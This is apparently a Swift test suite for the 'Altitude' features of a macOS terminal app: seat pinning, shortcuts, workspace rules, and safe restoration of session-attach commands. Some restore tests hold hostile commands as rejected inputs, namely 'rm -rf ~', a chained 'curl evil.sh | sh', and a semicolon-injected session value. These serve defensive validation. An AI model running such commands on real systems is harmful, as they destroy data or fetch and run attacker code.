import AppKit
import Foundation
import Testing

#if canImport(cmux_DEV)
@testable import cmux_DEV
#elseif canImport(cmux)
@testable import cmux
#endif

@Suite("Altitude presence stages")
struct AltitudePresenceStageTests {
    private func configuration(brighten: Int = 120, pulse: Int = 300) -> AltitudeConfiguration {
        let defaults = UserDefaults(suiteName: "AltitudePresenceStageTests.\(UUID().uuidString)")!
        defaults.set(brighten, forKey: AltitudeConfiguration.readyBrightenSecondsKey)
        defaults.set(pulse, forKey: AltitudeConfiguration.pulseSecondsKey)
        return AltitudeConfiguration(defaults: defaults)
    }

    @Test("1A advances through all three stages")
    func priority1AStages() {
        let config = configuration()
        #expect(AltitudePresenceStage.resolve(waitSeconds: 0, priority: "1A", configuration: config) == .ready)
        #expect(AltitudePresenceStage.resolve(waitSeconds: 120, priority: "1A", configuration: config) == .bright)
        #expect(AltitudePresenceStage.resolve(waitSeconds: 300, priority: "1A", configuration: config) == .pulse)
    }

    @Test("1B never enters the pulse stage")
    func priority1BStopsAtBright() {
        let config = configuration()
        #expect(AltitudePresenceStage.resolve(waitSeconds: 600, priority: "1B", configuration: config) == .bright)
    }

    @Test("thresholds are configurable dials")
    func configurableThresholds() {
        let config = configuration(brighten: 5, pulse: 10)
        #expect(AltitudePresenceStage.resolve(waitSeconds: 5, priority: "1A", configuration: config) == .bright)
        #expect(AltitudePresenceStage.resolve(waitSeconds: 10, priority: "1A", configuration: config) == .pulse)
    }
}

@Suite("Altitude office surface matching")
struct AltitudeOfficeSurfaceMatcherTests {
    @Test("office attach process arguments identify the Studio session")
    func officeAttachArgumentsMatch() {
        let sessionID = "c5017c5d-e034-43da-8834-eb21479f8256"
        let evidence = AltitudeSurfaceEvidence(
            title: "[mosh] xianxing-altitude-third-pane",
            processArgumentVectors: [
                [
                    "node",
                    "/Users/teren/pcl-client/office/dist/index.js",
                    "a",
                    sessionID,
                ],
            ]
        )

        #expect(AltitudeSurfaceMatcher.matches(sessionIDs: [sessionID], tmuxSession: nil, evidence: evidence))
    }

    @Test("mosh tab title identifies the Studio tmux session")
    func moshTitleMatches() {
        let evidence = AltitudeSurfaceEvidence(
            title: "[mosh] xianxing-altitude-third-pane",
            processArgumentVectors: []
        )

        #expect(AltitudeSurfaceMatcher.matches(
            sessionIDs: [],
            tmuxSession: "xianxing-altitude-third-pane",
            evidence: evidence
        ))
    }

    @Test("partial identifiers do not create a false match")
    func partialIdentifierDoesNotMatch() {
        let evidence = AltitudeSurfaceEvidence(
            title: "[mosh] xianxing-altitude-third-pane-old",
            bindingText: ["tmux attach -t xianxing-altitude-third-pane-old"],
            processArgumentVectors: [["node", "office/dist/index.js", "a", "c5017c5d-old"]]
        )

        #expect(!AltitudeSurfaceMatcher.matches(
            sessionIDs: ["c5017c5d"],
            tmuxSession: "xianxing-altitude-third-pane",
            evidence: evidence
        ))
    }

    @Test("a bare process argument is not mistaken for an office attachment")
    func bareProcessArgumentDoesNotMatch() {
        let sessionID = "c5017c5d-e034-43da-8834-eb21479f8256"
        let evidence = AltitudeSurfaceEvidence(
            title: "unrelated",
            processArgumentVectors: [["node", "script.js", "--label", sessionID]]
        )

        #expect(!AltitudeSurfaceMatcher.matches(sessionIDs: [sessionID], tmuxSession: nil, evidence: evidence))
    }
}

@Suite("Altitude seat pinning")
struct AltitudeSeatPinningTests {
    @Test("another tab is refused from an occupied seat pane")
    func occupiedSeatRefusesOtherSurface() {
        let seatSurface = UUID()
        let incomingSurface = UUID()

        #expect(
            AltitudeSeatMovePolicy.decision(
                movingSurfaceID: incomingSurface,
                sourceSeatSurfaceID: nil,
                destinationSeatSurfaceID: seatSurface
            ) == .offerReanoint
        )
        #expect(
            AltitudeSeatMovePolicy.decision(
                movingSurfaceID: seatSurface,
                sourceSeatSurfaceID: seatSurface,
                destinationSeatSurfaceID: seatSurface
            ) == .allow
        )
        #expect(
            AltitudeSeatMovePolicy.decision(
                movingSurfaceID: incomingSurface,
                sourceSeatSurfaceID: nil,
                destinationSeatSurfaceID: nil
            ) == .allow
        )
    }


    @Test("an anointed tab cannot leave its seat pane")
    func anointedSurfaceRefusesMoveOut() {
        let seatSurface = UUID()
        #expect(
            AltitudeSeatMovePolicy.decision(
                movingSurfaceID: seatSurface,
                sourceSeatSurfaceID: seatSurface,
                destinationSeatSurfaceID: nil
            ) == .refuseAnointedSeatMove
        )
    }

    @Test("re-anointing the other seat swaps the roles")
    func reanointSwapsRoles() {
        let lead = UUID()
        let understudy = UUID()
        var configuration = PcLPrioritySwitcherConfiguration(
            leadSurfaceId: lead,
            understudySurfaceId: understudy
        )

        configuration.assign(role: .lead, surfaceId: understudy)

        #expect(configuration.leadSurfaceId == understudy)
        #expect(configuration.understudySurfaceId == lead)
    }
}


@Suite("Altitude mandated workspaces")
struct AltitudeWorkspaceMandateTests {
    @Test("resolution prefers the stored id, adopts by title, else creates")
    func mandateResolution() {
        let stored = UUID()
        let titled = UUID()
        let live: [(id: UUID, title: String)] = [(stored, "Whatever"), (titled, "priority ")]
        #expect(AltitudeWorkspaceMandate.resolution(storedID: stored, workspaces: live, mandated: .priority) == .existing(stored))
        // Dead stored id falls through to title adoption (case/space-insensitive).
        #expect(AltitudeWorkspaceMandate.resolution(storedID: UUID(), workspaces: [(titled, " Priority")], mandated: .priority) == .adopt(titled))
        #expect(AltitudeWorkspaceMandate.resolution(storedID: nil, workspaces: [], mandated: .flex) == .create)
    }

    @Test("mandated workspaces can never be closed and keep their names")
    func mandateProtections() {
        let priority = UUID()
        let flex = UUID()
        let other = UUID()
        #expect(!AltitudeWorkspaceMandate.allowsClose(workspaceID: priority, priorityID: priority, flexID: flex))
        #expect(!AltitudeWorkspaceMandate.allowsClose(workspaceID: flex, priorityID: priority, flexID: flex))
        #expect(AltitudeWorkspaceMandate.allowsClose(workspaceID: other, priorityID: priority, flexID: flex))
        #expect(!AltitudeWorkspaceMandate.allowsRename(workspaceID: priority, proposedTitle: "Stuff", priorityID: priority, flexID: flex))
        #expect(AltitudeWorkspaceMandate.allowsRename(workspaceID: priority, proposedTitle: "priority", priorityID: priority, flexID: flex))
        #expect(AltitudeWorkspaceMandate.allowsRename(workspaceID: other, proposedTitle: "Stuff", priorityID: priority, flexID: flex))
    }

    @Test("Priority admits only the seats; everything else bounces to Flex")
    func membershipEnforcement() {
        let priority = UUID()
        let lead = UUID()
        let understudy = UUID()
        let interloper = UUID()
        #expect(AltitudeWorkspaceMandate.membership(surfaceID: lead, destinationWorkspaceID: priority, priorityID: priority, leadSurfaceID: lead, understudySurfaceID: understudy) == .allow)
        #expect(AltitudeWorkspaceMandate.membership(surfaceID: interloper, destinationWorkspaceID: priority, priorityID: priority, leadSurfaceID: lead, understudySurfaceID: understudy) == .bounceToFlex)
        // Flex and ordinary workspaces admit anything.
        #expect(AltitudeWorkspaceMandate.membership(surfaceID: interloper, destinationWorkspaceID: UUID(), priorityID: priority, leadSurfaceID: lead, understudySurfaceID: understudy) == .allow)
    }
}

@Suite("Altitude command palette corpus")
struct AltitudeCommandPaletteCorpusTests {
    @Test("an empty query shows Altitude priority and needs-you entries")
    func emptyQueryShowsAltitudeEntries() {
        let entries = AltitudePaletteCorpus.orderedEntries(
            query: "  ",
            priorityEntries: ["priority"],
            needsYouEntries: ["needs-you"]
        )
        #expect(entries == ["priority", "needs-you"])
    }

    @Test("a typed query removes Altitude-only entries from the original switcher corpus")
    func typedQueryUsesOriginalCorpus() {
        let entries = AltitudePaletteCorpus.orderedEntries(
            query: "needs teren",
            priorityEntries: ["priority"],
            needsYouEntries: ["needs-you"]
        )
        #expect(entries.isEmpty)
    }
}

@Suite("Altitude priority shortcuts")
struct AltitudePriorityShortcutTests {
    @Test("command one and command two route to the two priority seats")
    func routesPrioritySeats() {
        #expect(AltitudePriorityShortcut.priority(
            isAltitudeEnabled: true,
            characters: "1",
            keyCode: 18,
            modifierFlags: [.command],
            textInputOwnsEvent: false
        ) == "1A")
        #expect(AltitudePriorityShortcut.priority(
            isAltitudeEnabled: true,
            characters: "2",
            keyCode: 19,
            modifierFlags: [.command],
            textInputOwnsEvent: false
        ) == "1B")
        #expect(AltitudePriorityShortcut.hint(for: "1A") == "⌘1")
        #expect(AltitudePriorityShortcut.hint(for: "1B") == "⌘2")
    }

    @Test("vanilla, modified chords, and text input retain existing behavior")
    func preservesExistingRoutingOutsideAltitude() {
        #expect(AltitudePriorityShortcut.priority(
            isAltitudeEnabled: false,
            characters: "1",
            keyCode: 18,
            modifierFlags: [.command],
            textInputOwnsEvent: false
        ) == nil)
        #expect(AltitudePriorityShortcut.priority(
            isAltitudeEnabled: true,
            characters: "1",
            keyCode: 18,
            modifierFlags: [.command, .option],
            textInputOwnsEvent: false
        ) == nil)
        #expect(AltitudePriorityShortcut.priority(
            isAltitudeEnabled: true,
            characters: "1",
            keyCode: 18,
            modifierFlags: [.command],
            textInputOwnsEvent: true
        ) == nil)
    }

    @Test("priority shortcuts focus the globally anointed surfaces directly")
    func globallyFocusesAnointedSurfaces() {
        let lead = UUID()
        let understudy = UUID()
        let configuration = PcLPrioritySwitcherConfiguration(
            leadSurfaceId: lead,
            understudySurfaceId: understudy
        )

        #expect(AltitudePriorityFocusTarget.surfaceID(for: "1A", configuration: configuration) == lead)
        #expect(AltitudePriorityFocusTarget.surfaceID(for: "1B", configuration: configuration) == understudy)
        #expect(AltitudePriorityFocusTarget.surfaceID(for: "2", configuration: configuration) == nil)
    }
}

@Suite("Altitude office attach restoration")
struct AltitudeOfficeAttachResumeTests {
    @Test("the exact office attach command becomes a process-detected resume binding")
    func recognizesOfficeAttach() throws {
        let sessionID = "c5017c5d-e034-43da-8834-eb21479f8256"
        let binding = try #require(AltitudeOfficeAttachResumeParser.binding(
            processName: "node",
            processPath: "/opt/homebrew/bin/node",
            arguments: [
                "/opt/homebrew/bin/node",
                "/Users/teren/pcl-client/office/dist/index.js",
                "a",
                sessionID,
            ],
            environment: ["PWD": "/Users/teren"],
            homeDirectory: "/Users/teren",
            isEnabled: true,
            capturedAt: 1_777_777_777
        ))

        #expect(binding.kind == "altitude-office-attach")
        #expect(binding.checkpointId == sessionID)
        #expect(binding.source == "process-detected")
        #expect(binding.autoResume == true)
        #expect(binding.command.contains("/Users/teren/pcl-client/office/dist/index.js"))
        #expect(binding.command.contains(sessionID))
    }

    @Test("arbitrary node commands and disabled restore are never replayed")
    func rejectsUnrecognizedCommands() {
        let commonArguments = [
            "node",
            "/Users/teren/pcl-client/office/dist/index.js",
            "a",
            "c5017c5d-e034-43da-8834-eb21479f8256",
        ]
        #expect(AltitudeOfficeAttachResumeParser.binding(
            processName: "node",
            processPath: nil,
            arguments: ["node", "/Users/teren/scripts/anything.js", "a", "session"],
            environment: [:],
            homeDirectory: "/Users/teren",
            isEnabled: true,
            capturedAt: 1
        ) == nil)
        #expect(AltitudeOfficeAttachResumeParser.binding(
            processName: "python",
            processPath: nil,
            arguments: commonArguments,
            environment: [:],
            homeDirectory: "/Users/teren",
            isEnabled: true,
            capturedAt: 1
        ) == nil)
        #expect(AltitudeOfficeAttachResumeParser.binding(
            processName: "node",
            processPath: nil,
            arguments: ["node", "/Users/teren/pcl-client/office/dist/index.js", "run", "session"],
            environment: [:],
            homeDirectory: "/Users/teren",
            isEnabled: true,
            capturedAt: 1
        ) == nil)
        #expect(AltitudeOfficeAttachResumeParser.binding(
            processName: "node",
            processPath: nil,
            arguments: ["node", "/Users/teren/pcl-client/office/dist/index.js", "a", "session;echo unsafe"],
            environment: [:],
            homeDirectory: "/Users/teren",
            isEnabled: true,
            capturedAt: 1
        ) == nil)
        #expect(AltitudeOfficeAttachResumeParser.binding(
            processName: "node",
            processPath: nil,
            arguments: commonArguments,
            environment: [:],
            homeDirectory: "/Users/teren",
            isEnabled: false,
            capturedAt: 1
        ) == nil)
    }

    @Test("office attach restoration defaults on and has an off dial")
    func configurationDial() {
        let defaults = UserDefaults(suiteName: "AltitudeOfficeAttachResumeTests.\(UUID().uuidString)")!
        #expect(AltitudeConfiguration(defaults: defaults).restoreOfficeAttaches)
        defaults.set(false, forKey: AltitudeConfiguration.restoreOfficeAttachesKey)
        #expect(!AltitudeConfiguration(defaults: defaults).restoreOfficeAttaches)
    }

    @Test("captured office bindings are gated again at execution time")
    func restoreExecutionGate() {
        #expect(AltitudeOfficeAttachResumePolicy.allowsRestore(
            bindingKind: "altitude-office-attach",
            isAltitudeEnabled: true,
            restoreOfficeAttaches: true
        ))
        #expect(!AltitudeOfficeAttachResumePolicy.allowsRestore(
            bindingKind: "altitude-office-attach",
            isAltitudeEnabled: true,
            restoreOfficeAttaches: false
        ))
        #expect(!AltitudeOfficeAttachResumePolicy.allowsRestore(
            bindingKind: "altitude-office-attach",
            isAltitudeEnabled: false,
            restoreOfficeAttaches: true
        ))
        #expect(AltitudeOfficeAttachResumePolicy.allowsRestore(
            bindingKind: "tmux",
            isAltitudeEnabled: false,
            restoreOfficeAttaches: false
        ))
    }

    // Wiring-level coverage: these call the REAL restore path
    // (Workspace.resumeBindingForSessionRestore), so they fail if the
    // altitude gate block or the replay-time re-validation is deleted —
    // the pure-function tests above cannot catch that.
    private func officeBinding(command: String, checkpointId: String? = "kleya-hive-drive") -> SurfaceResumeBindingSnapshot {
        SurfaceResumeBindingSnapshot(
            name: "Office kleya-hive-drive",
            kind: AltitudeOfficeAttachResumePolicy.bindingKind,
            command: command,
            checkpointId: checkpointId,
            source: "process-detected",
            autoResume: true,
            updatedAt: 0
        )
    }
    private let home = "/Users/teren"
    private var goodCommand: String {
        "'node' '/Users/teren/pcl-client/office/dist/index.js' 'a' 'kleya-hive-drive'"
    }

    @Test("restore wiring passes a recognized office binding through")
    func restoreWiringAllowsRecognized() {
        let binding = officeBinding(command: goodCommand)
        let restored = Workspace.resumeBindingForSessionRestore(
            binding, restorableAgent: nil,
            isAltitudeEnabled: true, restoreOfficeAttaches: true, homeDirectory: home
        )
        #expect(restored == binding)
    }

    @Test("restore wiring refuses a tampered stored command")
    func restoreWiringRefusesTamperedCommand() {
        for bad in [
            "rm -rf ~",
            "'node' '/Users/teren/pcl-client/office/dist/index.js' 'a' 'x' && curl evil.sh | sh",
            "'python3' '/Users/teren/pcl-client/office/dist/index.js' 'a' 'kleya-hive-drive'",
            "'node' '/tmp/evil.js' 'a' 'kleya-hive-drive'",
        ] {
            let restored = Workspace.resumeBindingForSessionRestore(
                officeBinding(command: bad), restorableAgent: nil,
                isAltitudeEnabled: true, restoreOfficeAttaches: true, homeDirectory: home
            )
            #expect(restored == nil, "must refuse: \(bad)")
        }
    }

    @Test("restore wiring refuses a checkpoint/session mismatch")
    func restoreWiringRefusesCheckpointMismatch() {
        let restored = Workspace.resumeBindingForSessionRestore(
            officeBinding(command: goodCommand, checkpointId: "some-other-session"),
            restorableAgent: nil,
            isAltitudeEnabled: true, restoreOfficeAttaches: true, homeDirectory: home
        )
        #expect(restored == nil)
    }

    @Test("restore wiring honors the disable dial and the Altitude gate")
    func restoreWiringHonorsGates() {
        let binding = officeBinding(command: goodCommand)
        #expect(Workspace.resumeBindingForSessionRestore(
            binding, restorableAgent: nil,
            isAltitudeEnabled: true, restoreOfficeAttaches: false, homeDirectory: home
        ) == nil)
        #expect(Workspace.resumeBindingForSessionRestore(
            binding, restorableAgent: nil,
            isAltitudeEnabled: false, restoreOfficeAttaches: true, homeDirectory: home
        ) == nil)
    }

    @Test("non-altitude bindings are untouched by the altitude gate")
    func restoreWiringLeavesVanillaAlone() {
        let vanilla = SurfaceResumeBindingSnapshot(
            name: "tmux main", kind: "tmux", command: "tmux attach -t main",
            checkpointId: nil, source: "process-detected", autoResume: true, updatedAt: 0
        )
        let restored = Workspace.resumeBindingForSessionRestore(
            vanilla, restorableAgent: nil,
            isAltitudeEnabled: false, restoreOfficeAttaches: false, homeDirectory: home
        )
        #expect(restored == vanilla)
    }
}

@Suite("Altitude TUI host presentation")
struct AltitudeTUIHostPresentationTests {
    @Test("the menu targets the first NON-SEAT pane, falling back to the last pane")
    func menuTargetPane() {
        // Canonical 3-pane: seats in panes a+b, stack c -> menu goes to c.
        #expect(AltitudeTUIHostPresentation.targetPane(paneIDs: ["a", "b", "c"], seatPanes: ["a", "b"]) == "c")
        // 2-pane vertical-screen shape: seat a, stack b -> menu goes to b.
        #expect(AltitudeTUIHostPresentation.targetPane(paneIDs: ["a", "b"], seatPanes: ["a"]) == "b")
        // Stack pane sits FIRST: position must not matter.
        #expect(AltitudeTUIHostPresentation.targetPane(paneIDs: ["c", "a", "b"], seatPanes: ["a", "b"]) == "c")
        // Every pane is a seat pane -> last pane rather than nowhere.
        #expect(AltitudeTUIHostPresentation.targetPane(paneIDs: ["a", "b"], seatPanes: ["a", "b"]) == "b")
        #expect(AltitudeTUIHostPresentation.targetPane(paneIDs: [String](), seatPanes: []) == nil)
    }

    @Test("command zero opens only outside AppKit text input")
    func commandZeroShortcut() {
        #expect(AltitudeMenuShortcut.matches(
            isAltitudeEnabled: true,
            characters: "0",
            keyCode: 29,
            modifierFlags: [.command],
            textInputOwnsEvent: false
        ))
        #expect(!AltitudeMenuShortcut.matches(
            isAltitudeEnabled: true,
            characters: "0",
            keyCode: 29,
            modifierFlags: [.command],
            textInputOwnsEvent: true
        ))
        #expect(!AltitudeMenuShortcut.matches(
            isAltitudeEnabled: false,
            characters: "0",
            keyCode: 29,
            modifierFlags: [.command],
            textInputOwnsEvent: false
        ))
        #expect(AltitudeMenuShortcut.matches(
            isAltitudeEnabled: true,
            characters: "0",
            keyCode: 29,
            modifierFlags: [.command, .capsLock, .numericPad],
            textInputOwnsEvent: false
        ))
    }

    @Test("anointed title prefixes replace rather than stack and clear cleanly")
    func anointedTabTitles() {
        let panelID = UUID()
        #expect(AltitudeSeatTitle.resolved(baseTitle: "edna-tgg", role: "1A") == "[1A] edna-tgg")
        #expect(AltitudeSeatTitle.resolved(baseTitle: "[1A] edna-tgg", role: "1B") == "[1B] edna-tgg")
        #expect(AltitudeSeatTitle.resolved(baseTitle: "[1B] edna-tgg", role: nil) == "edna-tgg")
        #expect(AltitudeSeatTitle.role(
            isAltitudeEnabled: true,
            panelID: panelID,
            leadSurfaceID: panelID,
            understudySurfaceID: nil
        ) == "1A")
        #expect(AltitudeSeatTitle.role(
            isAltitudeEnabled: false,
            panelID: panelID,
            leadSurfaceID: panelID,
            understudySurfaceID: nil
        ) == nil)
    }

    @Test("command construction uses the configured Bun and TUI directory without shell interpolation")
    func commandConstruction() {
        let command = AltitudeTUIHostPresentation.launchCommand(
            bunPath: "/Users/test/.bun/bin/bun",
            tuiDirectory: "/Users/test/cmux checkout/altitude-tui",
            returnTargetPath: "/Users/test/Library/Application Support/cmux/altitude-return.json"
        )
        #expect(command.contains("exec env"))
        #expect(command.contains("'/Users/test/.bun/bin/bun' run src/index.ts"))
        #expect(command.contains("'/Users/test/cmux checkout/altitude-tui'"))
        #expect(command.contains("ALTITUDE_RETURN_TARGET_FILE="))
        // node_modules is gitignored: first launch on a fresh checkout must
        // install or the pane dies with a module error.
        #expect(command.contains("[ -d node_modules ] || '/Users/test/.bun/bin/bun' install --frozen-lockfile"))
    }

    @Test("the TUI directory resolves at runtime, never from the build machine's #filePath, when any runtime source exists")
    func tuiDirectoryResolution() throws {
        let fileManager = FileManager.default
        let realDirectory = fileManager.temporaryDirectory
            .appendingPathComponent("altitude-tui-resolution-\(UUID().uuidString)", isDirectory: true)
        try fileManager.createDirectory(at: realDirectory, withIntermediateDirectories: true)
        defer { try? fileManager.removeItem(at: realDirectory) }
        let suiteName = "altitude-tui-resolution-\(UUID().uuidString)"
        let defaults = try #require(UserDefaults(suiteName: suiteName))
        defer { defaults.removePersistentDomain(forName: suiteName) }

        // Env override wins.
        #expect(AltitudeTUIHostPresentation.sourceTUIDirectory(
            sourceFile: "/build-machine/worktree/Sources/AltitudeConfiguration.swift",
            environment: ["ALTITUDE_TUI_DIR": realDirectory.path],
            defaults: defaults,
            bundleResourceURL: nil
        ) == realDirectory.path)

        // Then the per-user default.
        defaults.set(realDirectory.path, forKey: "AltitudeTUIDirectory")
        #expect(AltitudeTUIHostPresentation.sourceTUIDirectory(
            sourceFile: "/build-machine/worktree/Sources/AltitudeConfiguration.swift",
            environment: [:],
            defaults: defaults,
            bundleResourceURL: nil
        ) == realDirectory.path)

        // A configured path that does not exist is skipped, not trusted.
        defaults.set("/nonexistent/tui", forKey: "AltitudeTUIDirectory")
        let fallback = AltitudeTUIHostPresentation.sourceTUIDirectory(
            sourceFile: "/build-machine/worktree/Sources/AltitudeConfiguration.swift",
            environment: [:],
            defaults: defaults,
            bundleResourceURL: nil
        )
        #expect(fallback == "/build-machine/worktree/altitude-tui")
    }


    @Test("the launch script self-deletes and leaves no shell behind the TUI")
    func launchScriptShape() throws {
        let path = try #require(AltitudeTUIHostPresentation.writeLaunchScript(
            bunPath: "/Users/test/.bun/bin/bun",
            tuiDirectory: "/Users/test/deploy/altitude-tui",
            returnTargetPath: "/tmp/return.json"
        ))
        defer { try? FileManager.default.removeItem(atPath: path) }
        let body = try String(contentsOfFile: path, encoding: .utf8)
        #expect(body.hasPrefix("#!/bin/sh"))
        // Self-deletes so a quit-restore replay of a stale path fails cleanly.
        #expect(body.contains("rm -f -- \"$0\""))
        // Execs bun: when the TUI exits the PANE PROCESS dies, letting cmd-0
        // detect processExited and recreate. Nothing may FOLLOW the exec —
        // an interactive-shell fallback (the Dock wrapper's tail) would keep
        // the pane alive and read as a live menu forever.
        #expect(body.contains("exec env ALTITUDE_RETURN_TARGET_FILE="))
        #expect(body.trimmingCharacters(in: .whitespacesAndNewlines).hasSuffix("run src/index.ts"))
        let attributes = try FileManager.default.attributesOfItem(atPath: path)
        #expect((attributes[.posixPermissions] as? Int) == 0o700)
    }

    @Test("command zero toggles back to the previous surface when the TUI is already focused")
    func toggleDecision() {
        let tui = UUID()
        let previous = UUID()
        #expect(AltitudeTUIHostPresentation.toggleDecision(
            focusedPanelID: tui, tuiPanelID: tui, returnPanelID: previous
        ) == .returnTo(previous))
        #expect(AltitudeTUIHostPresentation.toggleDecision(
            focusedPanelID: previous, tuiPanelID: tui, returnPanelID: previous
        ) == .focusTUI)
        #expect(AltitudeTUIHostPresentation.toggleDecision(
            focusedPanelID: previous, tuiPanelID: nil, returnPanelID: nil
        ) == .createTUI)
    }
}
